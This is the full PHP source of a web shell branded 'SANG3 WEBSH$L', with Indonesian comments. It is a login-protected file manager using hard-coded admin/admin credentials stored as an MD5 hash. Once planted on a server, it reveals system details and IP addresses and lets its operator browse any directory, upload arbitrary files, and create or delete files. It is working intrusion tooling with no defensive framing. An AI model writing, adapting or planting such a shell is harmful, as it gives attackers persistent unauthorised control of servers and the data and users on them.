<?php
error_reporting(0);
session_start();

// Ganti sesuai kebutuhan
$USER = "admin";
$PASS_MD5 = "21232f297a57a5a743894a0e4a801fc3"; // md5('admin')


// Handle login
if (isset($_POST['user']) && isset($_POST['pass'])) {
    if ($_POST['user'] === $USER && md5($_POST['pass']) === $PASS_MD5) {
        $_SESSION['login'] = true;
        header("Location: ?");
        exit;
    } else {
        $error = "Login failed.";
    }
}

// Show login form
if (!isset($_SESSION['login'])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login</title>
        <style>
            body { background: #111; color: #fff; font-family: monospace; text-align: center; padding-top: 10%; }
            input { background: #222; color: red; padding: 6px; border: 1px solid red; margin: 4px; }
            button { background: red; color: #000; border: none; padding: 6px 12px; }
        </style>
    </head>
    <body>
        <h2><?php echo php_uname()?></h2>
        <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
        <form method="POST">
            <input type="text" name="user" placeholder="Username"><br>
            <input type="password" name="pass" placeholder="Password"><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    <?php
    exit;
}

// --------------- FILE MANAGER START ---------------
$cwd = getcwd();
$dir = $_GET['d'] ?? '.';
$path = realpath($dir);

// Buat folder
if (isset($_POST['mkdir'])) {
    $folder = $path . '/' . basename($_POST['folder']);
    mkdir($folder);
}

// Buat file
if (isset($_POST['mkfile'])) {
    $file = $path . '/' . basename($_POST['filename']);
    file_put_contents($file, '');
}

// Upload file
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . '/' . basename($_FILES['upload']['name']));
}

// Hapus file/folder
if (isset($_GET['delete'])) {
    $target = $path . '/' . basename($_GET['delete']);
    if (is_dir($target)) rmdir($target);
    else unlink($target);
}

$files = scandir($path);
?>
<!DOCTYPE html>
<html>
<head>
    <title>SANG3 WEBSH$L</title>
    <style>
        body {
            background: #0f0f0f;
            color: #fff;
            font-family: monospace;
        }
        h1 { color: #880808; }
        h3 { color:rgb(227, 8, 8); }


        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        th, td {
            padding: 8px;
            border-bottom: 1px solid #444;
            text-align: left;
        }
        a {
            color: rgb(227, 8, 8);;
            text-decoration: none;
        }
        .btn {
            background: #111;
            border: 1px solid #666;
            color: #fff;
            padding: 4px 10px;
            margin: 2px;
            cursor: pointer;
        }
        .btn:hover {
            background: #222;
        }
        input[type="text"], input[type="file"] {
            background: #222;
            border: 1px solid #555;
            color: rgb(227, 8, 8);
            padding: 4px;
        }
        .path {
            background: #1c1c1c;
            padding: 8px;
            margin-top: 10px;
            color: rgb(227, 8, 8);
        }
        .perm {
            color:rgb(227, 8, 8);
        }
    </style>
</head>
<body>

<div style="background-color: #1c1c1c; border-left: 4px solid rgb(227, 8, 8); padding-left: 10px; margin-bottom: 10px;">
    <h1>SANG3 WEBSH$L</h1><br>
    <div style="margin-bottom: 5px;">
        <h3 style="display:inline-block; margin:0;">SERVER :</h3>
        <p style="display:inline-block; margin:0 0 0 5px;"><?php echo php_uname(); ?></p>
    </div>
    <div style="margin-bottom: 5px;">
          <h3 style="display:inline-block; margin:0;">IP MU :</h3>
          <p style="display:inline-block; margin:0 0 0 5px;"><?php echo $_SERVER['REMOTE_ADDR']; ?></p>
        </div>
        <div>
          <h3 style="display:inline-block; margin:0;">IP SERVER :</h3>
          <p style="display:inline-block; margin:0 0 0 5px;"><?php echo $_SERVER['SERVER_ADDR']; ?></p>
        </div>
        <div>
          <h3 style="display:inline-block; margin:0;">VERSI PHP : </h3>
          <p style="display:inline-block; margin:0 0 0 5px;"><?php echo phpversion(); ?></p>
        </div>
</div><br>
<div class="path">path: <?= htmlspecialchars($path) ?></div>

<table>
    <thead>
        <tr>
            <th>Name</th><th>Size</th><th>Permission</th><th>Action</th>
        </tr>
    </thead>
    <tbody>
    <?php foreach ($files as $f):
        if ($f === '.') continue;
        $filePath = $path . '/' . $f;
        $isDir = is_dir($filePath);
        $size = $isDir ? '-' : filesize($filePath);
        $perm = substr(sprintf('%o', fileperms($filePath)), -4);
        $link = $isDir ? '?d=' . urlencode($dir . '/' . $f) : $f;
    ?>
        <tr>
            <td><a href="<?= $link ?>"><?= htmlspecialchars($f) ?><?= $isDir ? '/' : '' ?></a></td>
            <td><?= $size ?></td>
            <td class="perm"><?= $perm ?></td>
            <td><a class="btn" href="?d=<?= urlencode($dir) ?>&delete=<?= urlencode($f) ?>">Delete</a></td>
        </tr>
    <?php endforeach; ?>
    </tbody>
</table>
<br><br><br>
<div class="toolbar">
    <form method="POST" enctype="multipart/form-data" style="display:inline;">
        <input type="file" name="upload">
        <button class="btn" type="submit">Upload</button>
    </form>
    <form method="POST" style="display:inline;">
        <input type="text" name="folder" placeholder="Folder name">
        <button class="btn" name="mkdir">+ Create Folder</button>
    </form>
    <form method="POST" style="display:inline;">
        <input type="text" name="filename" placeholder="File name">
        <button class="btn" name="mkfile">+ Create File</button>
    </form>
</div>
</body>
</html>
